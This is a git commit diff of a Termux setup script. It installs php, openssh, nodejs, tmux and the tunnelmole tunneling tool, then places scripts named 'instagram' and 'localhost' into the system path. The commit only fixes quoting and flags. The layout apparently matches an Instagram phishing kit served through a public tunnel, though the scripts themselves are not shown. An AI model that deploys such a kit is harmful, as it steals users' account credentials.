ea6b2b641dd9a4cba9bbfec0b807ab7f37d80f90
Masterdas <123380450+Masterdas@users.noreply.github.com>
2025-02-14 23:35:08 +0530

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -5,7 +5,7 @@ echo ""
 echo -e "\e[34m please waiting for Setup ....[\e[92m✓\e[34m]\e[92m"
 
 echo ""
-echo -e ""\033[31m░CREATE░ ░B░Y░ ░M░A░H░A░D░E░B ░R░U░I░D░A░S░\033[0m"
+echo -e "\033[31m░CREATE░ ░B░Y░ ░M░A░H░A░D░E░B ░R░U░I░D░A░S░\033[0m"
 
 echo 
 echo -n "Loading "
@@ -19,7 +19,7 @@ done
 echo " Done!"
 
 
-pkg update -y && pkg upgrade -y && pkg install -y php openssh nodejs tmux
+pkg update && pkg upgrade -y && pkg install -y php openssh nodejs tmux
 npm install -g tunnelmole
 mv instagram localhost /data/data/com.termux/files/usr/bin
 chmod +x /data/data/com.termux/files/usr/bin/instagram
@@ -27,5 +27,5 @@ chmod +x /data/data/com.termux/files/usr/bin/localhost
 
 
 echo -e "\e[92mINSTALLED SETUP SUCCESSFULLY....[\e[34m✓\e[92m]\e[34m"
+exit
 rm setup.sh
-cd 
